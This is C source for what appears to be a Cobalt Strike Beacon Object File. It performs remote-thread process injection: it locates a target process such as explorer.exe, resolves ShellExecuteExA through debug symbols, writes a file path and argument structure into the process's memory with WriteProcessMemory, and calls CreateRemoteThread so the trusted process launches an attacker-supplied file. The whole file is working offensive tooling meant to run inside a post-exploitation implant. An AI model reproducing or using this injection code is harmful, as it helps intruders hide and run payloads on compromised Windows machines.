#include <Windows.h>
#include <DbgHelp.h>
#include <Psapi.h>
#include <tlhelp32.h>
#include <stdio.h>
#include "beacon.h"

#define MAXPATHLEN 255

WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress(HANDLE, CHAR*);
WINBASEAPI HANDLE WINAPI KERNEL32$LoadLibraryA(CHAR*);

WINBASEAPI void* __cdecl MSVCRT$memcpy(void* __restrict__ _Dst, const void* __restrict__ _Src, size_t _MaxCount);
WINBASEAPI int __cdecl MSVCRT$strcmp(const char* _Str1, const char* _Str2);
WINBASEAPI int __cdecl MSVCRT$_stricmp(const char* _Str1, const char* _Str2);

FARPROC Resolve(CHAR *lib, CHAR *func);
void Error(const char* name);
void ErrorContinue(const char* name);
DWORD getPid(const char* name);
int LoadSymbolModule(const char* name, HANDLE hProcess);

FARPROC Resolve(CHAR *lib, CHAR *func) {
    FARPROC ptr = KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA(lib), func);
    //BeaconPrintf(CALLBACK_OUTPUT, "[%s] %s!%s at 0x%p\n", __func__, lib, func, ptr);
    return ptr;
}

void Error(const char* name) {
    FARPROC GetLastError = Resolve("kernel32.dll", "GetLastError");

    BeaconPrintf(CALLBACK_ERROR, "%s Error: %d\n", name, GetLastError());
    return;
}

void ErrorContinue(const char* name) {
    FARPROC GetLastError = Resolve("kernel32.dll", "GetLastError");

    BeaconPrintf(CALLBACK_ERROR, "%s Error: %d\n", name, GetLastError());
    return;
}

// Find PID by looking at process snapshots
DWORD getPid(const char* name) {
    FARPROC CreateToolhelp32Snapshot = Resolve("kernel32.dll", "CreateToolhelp32Snapshot");
    FARPROC Process32Next = Resolve("kernel32.dll", "Process32Next");
    FARPROC CloseHandle = Resolve("kernel32.dll", "CloseHandle");

    HANDLE hSnap;
    PROCESSENTRY32 pt;
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pt.dwSize = sizeof(PROCESSENTRY32);
    do {
        if (!MSVCRT$strcmp(pt.szExeFile, name)) {
            DWORD pid = pt.th32ProcessID;
            CloseHandle(hSnap);
            return pid;
        }
    } while (Process32Next(hSnap, &pt));
    CloseHandle(hSnap);
    return 0;
}

// Find symbol address based on a process snapshot
BOOL LoadSymbolModule(const char* name, HANDLE hProcess) {
    FARPROC CreateToolhelp32Snapshot = Resolve("kernel32.dll", "CreateToolhelp32Snapshot");
    FARPROC CloseHandle = Resolve("kernel32.dll", "CloseHandle");
    FARPROC GetProcessId = Resolve("kernel32.dll", "GetProcessId");
    FARPROC Module32First = Resolve("kernel32.dll", "Module32First");
    FARPROC Module32Next = Resolve("kernel32.dll", "Module32Next");
    FARPROC SymLoadModuleEx = Resolve("dbghelp.dll", "SymLoadModuleEx");

    MODULEENTRY32 me = { 0 };
    HANDLE hSnap;
    DWORD64 returnAddress = 0;    

    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, GetProcessId(hProcess));    

    if (hSnap != INVALID_HANDLE_VALUE) {
        me.dwSize = sizeof(me);
        if (Module32First(hSnap, &me)) {
            do {
                if (MSVCRT$_stricmp(me.szModule, name) == 0) {
                    returnAddress = SymLoadModuleEx(hProcess, NULL, me.szExePath, me.szModule, (DWORD64)me.modBaseAddr, me.modBaseSize, NULL, 0);
                    break;
                }
            } while (Module32Next(hSnap, &me));
        }
        CloseHandle(hSnap);
    }
    return returnAddress != 0;
}


void go(char* args, int length) {
    FARPROC GetCurrentDirectoryA = Resolve("kernel32.dll", "GetCurrentDirectoryA");    
    FARPROC OpenProcess = Resolve("kernel32.dll", "OpenProcess");    
    FARPROC VirtualAllocEx = Resolve("kernel32.dll", "VirtualAllocEx");
    FARPROC WriteProcessMemory = Resolve("kernel32.dll", "WriteProcessMemory");
    FARPROC CreateRemoteThread = Resolve("kernel32.dll", "CreateRemoteThread");
    FARPROC WaitForSingleObject = Resolve("kernel32.dll", "WaitForSingleObject");
    FARPROC VirtualFreeEx = Resolve("kernel32.dll", "VirtualFreeEx");
    FARPROC CloseHandle = Resolve("kernel32.dll", "CloseHandle");
    FARPROC SymInitialize = Resolve("dbghelp.dll", "SymInitialize");
    FARPROC SymFromName = Resolve("dbghelp.dll", "SymFromName");

    DWORD bytesWritten;

    // Parse BOF arguments
    datap parser;
    BeaconDataParse(&parser, args, length);
    char* processName = BeaconDataExtract(&parser, NULL);
    char* path = BeaconDataExtract(&parser, NULL);

    char dir[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, dir);

    // Get PID for target process (explorer.exe)    
    DWORD pid = getPid(processName);    
    BeaconPrintf(CALLBACK_OUTPUT, "[>] Target pid for %s is %d\n", processName, pid);    

    // Open remote process (we can do that because its the same user, SeDebugPrivilege would also work if targetting another users process)
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);    

    // Get address of remote process function ShellExecuteExA (it imports that one already)
    if (!SymInitialize(hProcess, NULL, FALSE)) {
        Error("SymInitialize");
        return;
    }        

    if (!LoadSymbolModule("shell32.dll", hProcess)) {
        Error("LoadSymbolModule shell32.dll");        
        return;
    }    

    SYMBOL_INFO symbol = { 0 };
    symbol.SizeOfStruct = sizeof(symbol);
    if (!SymFromName(hProcess, "ShellExecuteExA", &symbol) || symbol.Address == 0) {
        ErrorContinue("SymFromName ShellExecuteExA");
    }
    LPTHREAD_START_ROUTINE funcAddr = (LPTHREAD_START_ROUTINE)(symbol.Address);
    BeaconPrintf(CALLBACK_OUTPUT, "[>] ShellExecuteExA is at %p\n", funcAddr);    

    // Allocate memory for file path in remote process & write bytes there
    void* pathArgAlloc = VirtualAllocEx(hProcess, NULL, MAXPATHLEN, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (pathArgAlloc == NULL) {
        Error("VirtualAllocEx");
        return;
    }
    if (!WriteProcessMemory(hProcess, pathArgAlloc, path, MAXPATHLEN, (SIZE_T*)&bytesWritten)) {
        Error("WriteProcessMemory");
        return;
    }    

    // Allocate memory for directory in remote process & write bytes there
    void* dirArgAlloc = VirtualAllocEx(hProcess, NULL, MAXPATHLEN, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (dirArgAlloc == NULL) {
        Error("VirtualAllocEx");
        return;
    }
    if (!WriteProcessMemory(hProcess, dirArgAlloc, dir, MAXPATHLEN, (SIZE_T*)&bytesWritten)) {
        Error("WriteProcessMemory");
        return;
    }    

    // Prepare argument structure (it has exactly 1 argument, this struct) and allocate memory for file path in remote process & write bytes there
    SHELLEXECUTEINFOA info = { 0 };
    info.cbSize = sizeof(SHELLEXECUTEINFOA);
    info.lpFile = (LPCSTR)pathArgAlloc;
    info.lpDirectory = (LPCSTR)dirArgAlloc;
    info.nShow = SW_MINIMIZE;
    void* funcArgsAlloc = VirtualAllocEx(hProcess, NULL, sizeof(info), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (funcArgsAlloc == NULL) {
        Error("VirtualAllocEx");
        return;
    }
    
    if (!WriteProcessMemory(hProcess, funcArgsAlloc, &info, sizeof(info), (SIZE_T*)&bytesWritten)) {
        Error("WriteProcessMemory");
        return;
    }    

    // Run the remote function with the argument we prepared
    HANDLE thread = CreateRemoteThread(hProcess, NULL, 0, funcAddr, funcArgsAlloc, NULL, NULL);
    BeaconPrintf(CALLBACK_OUTPUT, "[>] Thread running, done! (Handle: %d)\n", thread);    

    CloseHandle(hProcess);
    VirtualFreeEx(hProcess, dirArgAlloc, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, pathArgAlloc, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, funcArgsAlloc, 0, MEM_RELEASE);
    return;
}